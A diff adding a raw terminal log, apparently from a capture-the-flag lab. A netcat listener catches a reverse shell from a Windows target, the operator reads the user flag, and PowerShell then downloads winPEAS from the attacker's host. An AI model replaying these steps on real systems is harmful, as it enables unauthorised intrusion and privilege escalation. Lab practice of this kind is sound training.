@@ -1,0 +1,60 @@
+└─$ nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.65] from (UNKNOWN) [10.129.32.176] 49676
+Microsoft Windows [Version 10.0.17763.2061]
+(c) 2018 Microsoft Corporation. All rights reserved.    
+
+C:\Users\sql_svc\Downloads>cd ..
+cd ..
+
+C:\Users\sql_svc>dir  
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 9565-0B4F
+
+ Directory of C:\Users\sql_svc
+
+01/20/2020  06:01 AM    <DIR>          .
+01/20/2020  06:01 AM    <DIR>          ..
+01/20/2020  06:01 AM    <DIR>          3D Objects
+01/20/2020  06:01 AM    <DIR>          Contacts
+01/20/2020  06:42 AM    <DIR>          Desktop
+01/20/2020  06:01 AM    <DIR>          Documents
+04/19/2023  09:19 PM    <DIR>          Downloads
+01/20/2020  06:01 AM    <DIR>          Favorites
+01/20/2020  06:01 AM    <DIR>          Links
+01/20/2020  06:01 AM    <DIR>          Music
+01/20/2020  06:01 AM    <DIR>          Pictures
+01/20/2020  06:01 AM    <DIR>          Saved Games
+01/20/2020  06:01 AM    <DIR>          Searches
+01/20/2020  06:01 AM    <DIR>          Videos
+               0 File(s)              0 bytes
+              14 Dir(s)  10,715,836,416 bytes free
+
+C:\Users\sql_svc>cd Desktop
+cd Desktop
+
+C:\Users\sql_svc\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 9565-0B4F
+
+ Directory of C:\Users\sql_svc\Desktop
+
+01/20/2020  06:42 AM    <DIR>          .
+01/20/2020  06:42 AM    <DIR>          ..
+02/25/2020  07:37 AM                32 user.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  10,715,836,416 bytes free
+
+C:\Users\sql_svc\Desktop>type user.txt
+type user.txt                                                                    
+3e7b102e78218e935bf3f4951fec21a3                                                 
+C:\Users\sql_svc\Desktop>powershell
+powershell
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\sql_svc\Desktop> wget http://10.10.14.65/winPEASx64.exe -outfile winpeas.exe
+wget http://10.10.14.65/winPEASx64.exe -outfile winpeas.exe
+
